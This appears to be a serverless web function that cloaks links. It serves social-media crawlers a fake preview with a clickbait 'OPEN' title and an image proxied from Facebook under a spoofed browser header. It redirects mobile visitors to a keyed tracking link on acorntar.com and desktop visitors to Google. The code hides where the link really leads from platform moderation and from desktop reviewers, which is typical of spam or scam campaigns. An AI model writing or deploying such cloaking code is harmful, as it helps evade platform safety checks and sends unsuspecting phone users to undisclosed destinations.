export async function onRequest(context) {
  const request = context.request;
  const url = new URL(request.url);
  const userAgent = request.headers.get('user-agent') || '';

  // ===== Image Proxy Route =====
  if (url.pathname === '/og-image') {
    const imageUrl = "https://business.facebook.com/photo.php?fbid=122109573903450292";

    const imageResponse = await fetch(imageUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Referer': 'https://www.facebook.com/',
      }
    });

    return new Response(imageResponse.body, {
      headers: {
        'Content-Type': 'image/jpeg',
        'Cache-Control': 'public, max-age=86400',
      }
    });
  }

  // ===== Social Bot Check =====
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="🎬O▂P▂▂E▂N🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="${url.origin}/og-image">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // ===== Mobile / Desktop Redirect =====
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
  if (isMobile) {
    return Response.redirect("https://acorntar.com/mxxcdagb?key=e6e8236c6980d94ca8e81d0b03ea93df", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
